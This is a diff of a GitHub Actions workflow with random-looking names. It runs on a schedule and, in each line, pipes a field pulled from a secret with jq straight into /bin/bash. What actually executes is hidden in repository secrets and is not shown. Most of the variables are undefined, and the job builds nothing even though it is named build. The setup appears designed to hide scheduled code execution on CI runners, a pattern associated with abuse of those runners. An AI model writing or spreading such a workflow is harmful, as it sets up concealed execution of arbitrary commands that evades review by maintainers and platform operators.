@@ -2,26 +2,24 @@ name: wendixiang9772
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '32 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wendixiang9772
         env:
-          pkrg83981: ${{ secrets.pkrg83981 }}
+          gvlep0577: ${{ secrets.gvlep0577 }}
         run: |
-          echo $pkrg83981 | jq -r .nhg303 | /bin/bash
-          echo $q22067 | jq -r .shpbj048 | /bin/bash
-          echo $uabxl2066 | jq -r .rhy27956 | /bin/bash
-          echo $nkyg8449 | jq -r .e8 | /bin/bash
-          echo $diit78987 | jq -r .snco874 | /bin/bash
-          echo $wlmli3 | jq -r .gvzyb93 | /bin/bash
-          echo $eqh1 | jq -r .onoi628 | /bin/bash
-          echo $ex238 | jq -r .zkmn9577 | /bin/bash
-          echo $ojg30544 | jq -r .lf931 | /bin/bash
-          echo $kdnc028 | jq -r .adejy852 | /bin/bash
-          echo $u80854 | jq -r .xn35 | /bin/bash
+          echo $gvlep0577 | jq -r .zaf5 | /bin/bash
+          echo $qy917 | jq -r .f846 | /bin/bash
+          echo $xeugv61003 | jq -r .pooe2879 | /bin/bash
+          echo $ygqbj5 | jq -r .huvr95 | /bin/bash
+          echo $le171 | jq -r .lr80483 | /bin/bash
+          echo $vjjj55 | jq -r .ggc59841 | /bin/bash
+          echo $vug03 | jq -r .z81520 | /bin/bash
+          echo $k80029 | jq -r .fy55687 | /bin/bash
+          echo $odl285 | jq -r .bvdhz97 | /bin/bash
 
